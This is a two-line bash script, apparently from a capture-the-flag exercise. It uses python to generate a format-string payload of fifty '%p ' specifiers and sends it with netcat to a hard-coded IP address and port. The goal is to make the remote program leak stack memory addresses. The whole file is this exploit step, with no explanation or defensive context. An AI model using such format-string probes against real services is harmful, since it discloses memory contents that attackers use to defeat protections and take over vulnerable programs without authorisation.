#!/bin/bash

python -c "print('%p '*50)" | nc 173.255.201.51 51337
